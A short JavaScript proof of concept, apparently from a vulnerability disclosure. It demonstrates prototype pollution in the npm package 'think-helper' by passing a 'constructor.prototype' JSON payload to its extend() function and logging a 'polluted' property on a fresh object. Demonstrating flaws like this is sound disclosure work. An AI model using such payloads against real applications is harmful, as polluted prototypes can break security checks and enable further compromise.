const a = require('think-helper');
let obj = {};
console.log({}.polluted);
a.extend(obj, JSON.parse('{"constructor": {"prototype": {"polluted":"yes"}}}'));
console.log({}.polluted);